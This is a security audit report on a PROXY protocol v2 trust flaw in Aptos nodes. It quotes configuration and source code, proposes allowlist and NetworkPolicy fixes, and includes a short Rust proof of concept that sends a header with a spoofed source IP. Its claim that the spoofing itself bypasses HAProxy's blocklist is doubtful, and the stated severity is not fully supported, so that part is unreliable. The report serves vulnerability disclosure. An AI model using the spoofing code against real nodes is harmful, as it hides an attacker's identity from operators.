# Audit Report

## Title
Proxy Protocol Spoofing Vulnerability Allows Bypass of IP-Based Security Controls

## Summary
When `enable_proxy_protocol=true`, Aptos nodes accept and trust HAProxy PROXY protocol v2 headers from any connection without validating the source. An attacker with direct network access to the node can send crafted proxy protocol headers with a spoofed source IP address, bypassing HAProxy's IP blocklist and per-IP bandwidth rate limiting controls.

## Finding Description

The vulnerability exists in the proxy protocol implementation used by Aptos nodes when deployed behind HAProxy. The system is designed with the following architecture:

**Intended Flow:** Client → HAProxy (IP blocking + rate limiting) → Aptos Node (reads proxy protocol)

HAProxy is configured to:
- Block malicious IPs using `blocked.ips` file [1](#0-0) 
- Enforce bandwidth rate limiting at 50 MB/s per source IP [2](#0-1) 
- Forward connections to backend nodes with `send-proxy-v2` headers [3](#0-2) 

When `enable_proxy_protocol=true`, the Aptos node's inbound connection handler reads proxy protocol headers to extract the original client IP [4](#0-3) 

**Critical Flaw:** The proxy protocol header is processed **before** authentication and **without validating the connection source**. The `proxy_protocol::read_header()` function accepts any valid PPv2 signature without checking if the connection is from a trusted proxy [5](#0-4) 

**Attack Scenario:**
1. Attacker bypasses HAProxy through misconfiguration, network-level access, or internal positioning
2. Attacker connects directly to the Aptos node (which has `enable_proxy_protocol=true`)
3. Attacker sends crafted HAProxy PROXY protocol v2 headers with spoofed source IP
4. Node accepts spoofed IP and stores it in `ConnectionMetadata.addr` [6](#0-5) 
5. All subsequent logging, monitoring, and any IP-based controls use the spoofed address

The spoofed IP bypasses:
- HAProxy's IP blocklist (attacker appears as non-blocked IP)
- HAProxy's per-IP bandwidth rate limiting (attacker's real IP isn't tracked)
- Security monitoring and incident response (logs show spoofed IP)

## Impact Explanation

**Severity: High**

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator/Node Slowdowns:** By bypassing the 50 MB/s per-IP bandwidth rate limit, an attacker can consume excessive bandwidth and resources, causing validator or fullnode performance degradation.

2. **Significant Protocol Violation:** The vulnerability bypasses multiple security controls that are fundamental to the node's security architecture:
   - IP-based access control (blocklist bypass)
   - Rate limiting (resource exhaustion protection bypass)
   - Security logging and forensics (IP spoofing for evasion)

3. **Availability Impact:** Attackers can perform amplified resource consumption attacks by:
   - Appearing as multiple "different" IPs to bypass rate limits
   - Evading IP-based blocking after detection
   - Exhausting node resources (bandwidth, connections, memory)

While this does not directly cause consensus violations or loss of funds, it enables attacks that can degrade node performance and availability, which falls under "Validator node slowdowns" and "Significant protocol violations" in the High Severity category.

## Likelihood Explanation

**Likelihood: Medium-Low (but impact is severe when exploitable)**

The vulnerability requires specific conditions:
1. Node has `enable_proxy_protocol=true` configured
2. Attacker can bypass HAProxy and connect directly to the node
3. Node ports are accessible from attacker's network position

This can occur through:
- **Misconfiguration:** Node ports exposed without proper firewall rules
- **Network Access:** Attacker on same network segment (internal threat, container escape)
- **Development/Test Environments:** Nodes without production-grade network isolation
- **Kubernetes NetworkPolicy gaps:** Missing or misconfigured network policies

The code shows no validation that proxy protocol headers come from trusted sources [7](#0-6)  - any connection presenting valid PPv2 headers will have them processed.

## Recommendation

Implement **trusted proxy source validation** to ensure proxy protocol headers are only accepted from authorized sources:

**Option 1: Trusted Proxy IP Allowlist**
```rust
// In TransportContext or NetworkConfig
pub struct ProxyProtocolConfig {
    pub enabled: bool,
    pub trusted_proxies: Vec<IpAddr>, // Only accept from these IPs
}

// In upgrade_inbound() before reading proxy protocol
if proxy_protocol_enabled {
    let socket_addr = get_peer_addr(&socket)?;
    if !is_trusted_proxy(&socket_addr, &trusted_proxies) {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "Proxy protocol headers not accepted from untrusted source"
        ));
    }
    let addr = proxy_protocol::read_header(&addr, &mut socket).await?;
}
```

**Option 2: Disable Proxy Protocol for Direct Connections**
Configure network policies to ensure nodes only accept connections through HAProxy, and document that `enable_proxy_protocol` must only be enabled with proper network isolation.

**Option 3: Kubernetes NetworkPolicy Enforcement**
Add strict NetworkPolicies to ensure nodes only accept connections on proxy-protocol-enabled ports from HAProxy pods:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: aptos-node-ingress
spec:
  podSelector:
    matchLabels:
      app: aptos-node
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: haproxy
    ports:
    - protocol: TCP
      port: 6180  # Only allow HAProxy to connect
```

## Proof of Concept

```rust
// Rust PoC demonstrating proxy protocol spoofing
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect directly to Aptos node (bypassing HAProxy)
    let mut stream = TcpStream::connect("aptos-node:6182").await?;
    
    // Craft HAProxy PROXY protocol v2 header with spoofed IP
    let mut ppv2_header = Vec::new();
    
    // PPv2 signature
    ppv2_header.extend_from_slice(&[
        0x0D, 0x0A, 0x0D, 0x0A, 0x00, 0x0D, 0x0A, 0x51, 0x55, 0x49, 0x54, 0x0A,
    ]);
    
    // Version 2, PROXY command
    ppv2_header.push(0x21);
    
    // TCP over IPv4
    ppv2_header.push(0x11);
    
    // Address length: 12 bytes
    ppv2_header.extend_from_slice(&[0x00, 0x0C]);
    
    // Spoofed source IP: 1.1.1.1 (appears as trusted/non-blocked IP)
    ppv2_header.extend_from_slice(&[0x01, 0x01, 0x01, 0x01]);
    
    // Destination IP: 10.0.0.1 (node's IP)
    ppv2_header.extend_from_slice(&[0x0A, 0x00, 0x00, 0x01]);
    
    // Spoofed source port: 12345
    ppv2_header.extend_from_slice(&[0x30, 0x39]);
    
    // Destination port: 6182
    ppv2_header.extend_from_slice(&[0x18, 0x26]);
    
    // Send spoofed proxy protocol header
    stream.write_all(&ppv2_header).await?;
    
    // Continue with Noise handshake...
    // Node will now treat connection as coming from 1.1.1.1
    // bypassing any blocks/limits on attacker's real IP
    
    println!("Successfully spoofed source IP to 1.1.1.1");
    println!("Node will log all activity from this spoofed address");
    println!("HAProxy's IP blocklist and rate limits are bypassed");
    
    Ok(())
}
```

**Verification Steps:**
1. Deploy Aptos node with `enable_proxy_protocol: true`
2. Configure HAProxy with IP blocklist containing attacker's real IP
3. Bypass HAProxy and connect directly to node port
4. Send crafted PPv2 headers with spoofed IP (not in blocklist)
5. Observe node accepts connection and logs show spoofed IP
6. Perform bandwidth-intensive operations exceeding 50 MB/s per-IP limit
7. Confirm rate limits are not enforced on spoofed IP

## Notes

This vulnerability is a classic **proxy protocol trust boundary violation**. The node trusts proxy protocol headers from any source, violating the security assumption that only HAProxy sends such headers. The intended architecture requires defense-in-depth with network-level isolation, but the code does not enforce this requirement, making the system vulnerable to misconfiguration or network-level attacks.

The vulnerability does not directly affect consensus or cause fund loss, but it enables availability attacks and security control bypasses that can degrade network operations and complicate incident response.

### Citations

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L46-46)
```text
    tcp-request connection silent-drop if { src -n -f /usr/local/etc/haproxy/blocked.ips }
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L54-58)
```text
    # Create TCP request bandwidth limits of 50 MB/s (per source IP)
    filter bwlim-in incoming-src-limit key src table limit-by-src limit 50m
    filter bwlim-out outgoing-src-limit key src table limit-by-src limit 50m
    tcp-request content set-bandwidth-limit incoming-src-limit
    tcp-request content set-bandwidth-limit outgoing-src-limit
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L161-161)
```text
    default-server maxconn {{ $.Values.fullnode.config.max_inbound_connections }} {{ if $.Values.haproxy.config.send_proxy_protocol }}send-proxy-v2{{ end }}
```

**File:** network/framework/src/transport/mod.rs (L258-274)
```rust
    // If we have proxy protocol enabled, process the event, otherwise skip it
    // TODO: This would make more sense to build this in at instantiation so we don't need to put the if statement here
    let addr = if proxy_protocol_enabled {
        proxy_protocol::read_header(&addr, &mut socket)
            .await
            .map_err(|err| {
                debug!(
                    network_address = addr,
                    error = %err,
                    "ProxyProtocol: Failed to read header: {}",
                    err
                );
                err
            })?
    } else {
        addr
    };
```

**File:** network/framework/src/transport/mod.rs (L320-330)
```rust
    Ok(Connection {
        socket,
        metadata: ConnectionMetadata::new(
            remote_peer_id,
            CONNECTION_ID_GENERATOR.next(),
            addr,
            origin,
            messaging_protocol,
            application_protocols,
            peer_role,
        ),
```

**File:** network/netcore/src/transport/proxy_protocol.rs (L51-132)
```rust
pub async fn read_header<T: AsyncRead + std::marker::Unpin>(
    original_addr: &NetworkAddress,
    stream: &mut T,
) -> io::Result<NetworkAddress> {
    // This is small enough that it should not be fragmented by TCP
    let mut header = [0u8; 16];
    stream.read_exact(&mut header).await?;

    // If it's not proxy protocol, let's stop
    if header[0..12] != PPV2_SIGNATURE {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "ProxyProtocol: Invalid signature",
        ));
    }

    // High 4 bits is version, low 4 bits is command
    let version_and_command = header[12];
    match version_and_command {
        PPV2_LOCAL | PPV2_PROXY => (),
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "ProxyProtocol: Unsupported command or protocol version",
            ));
        },
    };

    // High 4 bits is family, low 4 bits is protocol
    let family_and_protocol = header[13];
    let address_size: [u8; 2] = header[14..16].try_into().unwrap();
    let address_size = u16::from_be_bytes(address_size);

    let mut address_bytes: Vec<u8> = vec![0; address_size as usize];
    stream.read_exact(&mut address_bytes).await?;

    let source_address = match family_and_protocol {
        // TODO: Support UDP in the future
        LOCAL_PROTOCOL | UDP_IPV4 | UDP_IPV6 | TCP_UNIX | UDP_UNIX => {
            // UNSPEC, UDP, and UNIX Steam/datagram
            // Accept connection but ignore address info as per spec
            original_addr.clone()
        },
        TCP_IPV4 => {
            // This is not mentioned in the spec, but if it doesn't match we might not read correctly
            if address_size < IPV4_SIZE {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "ProxyProtocol: Header size doesn't match expected address type",
                ));
            }

            let src_addr = u32::from_be_bytes(address_bytes[0..4].try_into().unwrap());
            let src_port = u16::from_be_bytes(address_bytes[8..10].try_into().unwrap());
            let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::from(src_addr)), src_port);
            NetworkAddress::from(socket_addr)
        },
        TCP_IPV6 => {
            // This is not mentioned in the spec, but if it doesn't match we might not read correctly
            if address_size < IPV6_SIZE {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "ProxyProtocol: Header size doesn't match expected address type",
                ));
            }

            let src_addr = u128::from_be_bytes(address_bytes[0..16].try_into().unwrap());
            let src_port = u16::from_be_bytes(address_bytes[32..34].try_into().unwrap());

            let socket_addr = SocketAddr::new(IpAddr::V6(Ipv6Addr::from(src_addr)), src_port);
            NetworkAddress::from(socket_addr)
        },
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "ProxyProtocol: Unsupported Address Family or Protocol",
            ));
        },
    };

    Ok(source_address)
}
```
